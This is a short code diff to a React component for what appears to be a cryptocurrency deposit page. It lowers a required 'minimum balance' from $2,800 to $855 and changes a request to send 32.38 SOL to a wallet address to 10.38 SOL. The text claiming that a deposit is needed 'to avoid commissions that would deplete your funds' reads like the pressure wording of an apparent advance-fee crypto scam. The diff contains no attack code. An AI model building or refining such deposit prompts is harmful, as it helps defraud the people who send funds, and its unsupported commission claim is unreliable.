@@ -47,7 +47,7 @@ const copyWallet = async () => {
 <div className="mb-[18px] rounded-[12px] border border-[#2f3541] bg-[#14151a] px-[14px] py-[12px]">
   <p className="text-[13px] font-[600] text-[#facc15]">
     To avoid commissions that would deplete your funds, 
-    it is necessary to have a minimum balance of $2,800 in your account.
+    it is necessary to have a minimum balance of $855 in your account.
 
   </p>
 </div>
@@ -74,7 +74,7 @@ const copyWallet = async () => {
         </div>
 
         <p className="mb-[16px] text-center text-[14px] text-[#a1a1aa]">
-          Scan or send 32.38 SOL to this address
+          Scan or send 10.38 SOL to this address
         </p>
 
         {/* Wallet */}
